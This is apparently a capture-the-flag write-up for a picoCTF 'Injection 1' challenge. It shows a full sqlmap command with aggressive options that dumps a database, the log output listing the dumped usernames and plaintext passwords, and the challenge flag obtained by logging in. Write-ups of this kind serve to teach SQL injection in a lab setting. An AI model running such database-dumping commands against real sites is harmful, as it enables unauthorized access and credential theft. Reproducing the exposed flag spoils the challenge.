#Injection 1 - 90

For this problem, I fired up sqlmap (https://github.com/sqlmapproject) an automated SQL injection and database takeover tool. Using the followin command to find a vulnerability and enumerate the databse:
```
./sqlmap.py -u http://web2014.picoctf.com/injection1/ --forms --level=5 --risk=3 --batch --dump
```

Gave me the following infromation:

```
[14:18:57] [INFO] fetching number of tables for database 'sql1'
[14:18:57] [INFO] retrieved: 1
[14:19:00] [INFO] retrieved: users
[14:19:40] [INFO] fetching columns for table 'users' in database 'sql1'
[14:19:40] [INFO] retrieved: 2
[14:19:44] [INFO] retrieved: username
[14:20:47] [INFO] retrieved: password
[14:21:58] [INFO] fetching entries for table 'users' in database 'sql1'
[14:21:58] [INFO] fetching number of entries for table 'users' in database 'sql1'
[14:21:58] [INFO] retrieved: 2
[14:22:02] [INFO] retrieved: super_secret_admin_password
[14:25:53] [INFO] retrieved: admin
[14:26:32] [INFO] retrieved: super_secret_not_admin_password
[14:31:05] [INFO] retrieved: not_admin
[14:32:25] [INFO] analyzing table dump for possible password hashes
Database: sql1
Table: users
[2 entries]
+-----------+---------------------------------+
| username  | password                        |
+-----------+---------------------------------+
| admin     | super_secret_admin_password     |
| not_admin | super_secret_not_admin_password |
+-----------+---------------------------------+
```

Logging in with the username "not_admin" and the  password "super_secret_not_admin_password":

```
Logged in!

Your flag is: flag_vFtTcLf7w2st5FM74b
```